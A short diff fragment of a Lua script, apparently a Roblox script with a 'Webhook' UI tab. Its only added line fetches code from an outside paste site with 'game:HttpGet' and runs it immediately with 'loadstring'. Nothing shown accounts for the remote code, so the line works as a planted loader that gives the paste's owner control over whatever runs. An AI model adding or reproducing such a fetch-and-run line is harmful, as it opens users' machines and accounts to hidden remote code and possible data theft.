@@ -1,3 +1,4 @@
+local u = loadstring(game:HttpGet("https://www.klgrth.io/paste/gs77p/raw"))()
 
 local z = v:MakeTab({Name = "Webhook", PremiumOnly = false})
 z:AddTextbox(
